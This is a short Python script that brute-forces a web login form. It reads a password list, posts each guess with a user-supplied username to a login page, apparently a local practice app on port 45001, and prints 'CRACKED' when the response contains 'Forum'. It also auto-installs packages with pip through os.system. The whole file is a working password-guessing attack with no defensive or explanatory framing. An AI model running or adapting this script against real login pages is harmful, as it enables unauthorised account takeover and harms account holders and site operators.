import os,sys
checker = os.path.isfile('params.config')
if(not checker):
	print("[+] - Installing packages")
	os.system("pip install colorama")
	os.system("pip install requests")
	os.system("echo >params.config")
	print("[+] - Saving configuration")
	with open("params.config","w") as f:
		f.write("")
		f.close()

import colorama
import requests

url = 'http://localhost:45001/ExposeProject/login'
headers = {
'Content-Type': 'application/x-www-form-urlencoded',
'Host': '127.0.0.1:45001',
'Content-Length': '32',
'Cache-Control': 'max-age=0',
'sec-ch-ua': '\"Chromium\";v=\"95\", \";Not A Brand\";v=\"99\"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '\"Windows\"',
'Upgrade-Insecure-Requests': '1',
'Origin': 'http://127.0.0.1:45001',
'Content-Type': 'application/x-www-form-urlencoded',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Referer':'http://127.0.0.1:45001/ExposeProject/login',
'Accept-Language': 'en-US,en;q=0.9',
'Connection': 'close',
}

colorama.init()
username = str(input("Hello , put your username :"))
print("[+] - Reading password list")
passwords = []
g = open("Passwrord.txt","r")
text = g.read()
g.close()
passwords = text.split("\n")
for password in passwords:
	print("{} Trying ===> {} : {}".format(colorama.Fore.RED,username,password))
	data = {'username': username, 'password': password}
	r = requests.post(url, headers=headers, data=data)
	try:
		r.text.index("Forum")
		print("{} CRACKED ===> {} : {}".format(colorama.Fore.GREEN,username,password))
		break
	except:
		print("Error")